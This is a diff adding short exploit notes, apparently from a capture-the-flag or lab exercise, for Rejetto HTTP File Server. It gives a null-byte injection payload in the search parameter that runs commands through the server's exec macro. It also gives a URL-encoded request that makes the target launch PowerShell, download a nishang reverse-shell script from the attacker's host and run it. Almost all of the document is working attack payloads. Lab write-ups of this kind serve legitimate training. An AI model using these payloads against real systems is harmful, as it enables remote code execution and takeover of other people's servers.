@@ -1,0 +1,34 @@
+#application hfs rejetto http file server
+
+#Metasploit Module:
+exploit/windows/http/rejetto_hfs_exec
+
+#Or, for detailed analysis, check this IppSec video:
+https://www.youtube.com/watch?v=kWTnVBIpNsE
+
+#Reference:
+http://www.rejetto.com/wiki/index.php/HFS:_scripting_commands
+
+#Exploit
+From details in that wiki page on the rajetto scripting above, one can craft a request like so for code exec:
+
+/?search=%00{.exec|ping+10.10.16.65.}
+
+This is derived from the exec command in the scripting language below, bypassing input validation via the null byte:
+
+exec | A 
+ask system to run file A, eventually with parameters. If you need to use the pipe, then use macro quoting.
+Optional parameter out will let you capture the console output of the program in the variable specified by name.
+Optional parameter timeout will specify the max number of seconds the app should be left running.
+Example: {.exec|notepad.}
+
+#Shell
+To get shell, you can use nishang powershell reverse shell (or whatever - right?), per the repo https://github.com/samratashok/nishang.git,
+add a last line in the script, Invoke-PowerShellTcp.ps1, under the nishang/Shells directory, and add the reverse shell
+syntax per the example in the usage. Serve that via python SimpleHTTPServer, and make the request via the following for
+the GET request to the HFS server:
+
+[URL ENCODED BELOW ((Burp Ctrl+U on selection))]
+/?search=%00{.exec|c%3a\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.16.65/Invoke-PowerShellTcp.ps1').}
+
+This should give you whatever you specified for a reverse shell in the ps1 script. 
